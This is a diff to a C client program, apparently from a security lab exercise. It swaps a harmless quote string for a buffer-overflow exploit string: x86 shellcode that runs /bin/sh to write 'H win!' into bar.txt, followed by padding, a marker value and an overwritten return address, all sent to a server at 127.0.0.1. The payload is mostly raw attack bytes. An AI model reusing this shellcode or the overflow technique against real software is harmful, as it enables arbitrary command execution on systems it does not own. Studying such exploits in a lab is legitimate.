@@ -25,10 +25,32 @@
 
 int main(int argc, char** argv)
 {
+/*
 	char reqstring[1000] =
 		"1|The cure for boredom is curiosity."
 		" There is no cure for curiosity."
 		" --Dorothy Parker";
+*/
+	char reqstring[1000] =
+		"1|\xeb\x5e\x90\x90\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08"
+		"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\xfc\x8d\x56\x0c\xcd"
+		"\x80\x90\x5e\x56\x88\x46\x02\xe8\xda\xff\xff\xff\x2f\x62\x69"
+		"\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b\x90\x90"
+		"\x90\x90\x90\x90\x5e\x56\x8a\x46\x06\x83\xc0\x01\x88\x46\x06"
+		"\x31\xc0\x88\x46\x17\xe8\xcb\xff\xff\xff\x2d\x63\x4a\x90\x90"
+		"\x90\x90\x90\x90\x90\x90\x31\xc0\x83\xec\x04\x89\x04\x24\x90"
+		"\x90\x90\x90\x90\x90\x90\x90\xe8\xcb\xff\xff\xff\x65\x63\x68"
+		"\x6f\x20\x22\x48\x20\x77\x69\x6e\x21\x22\x20\x3e\x20\x62\x61"
+		"\x72\x2e\x74\x78\x74\x4a"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfe\xca\xde\xde"
+		"AAAAAAAAAAAAAAAA"
+		"\x98\x6b\x48\x55"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		"AAAAAAAAAAAAAA";
 
 	int PORTNUM;
 	char SERVER_IP[16];
@@ -39,7 +61,7 @@ int main(int argc, char** argv)
 	struct sockaddr_in srv;
  
 	/* Set up some defaults for if you don't enter any parameters */ 
-	PORTNUM = 23781;
+	PORTNUM = 18732; //23781;
 	strcpy(SERVER_IP, "127.0.0.1");	
 
 	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
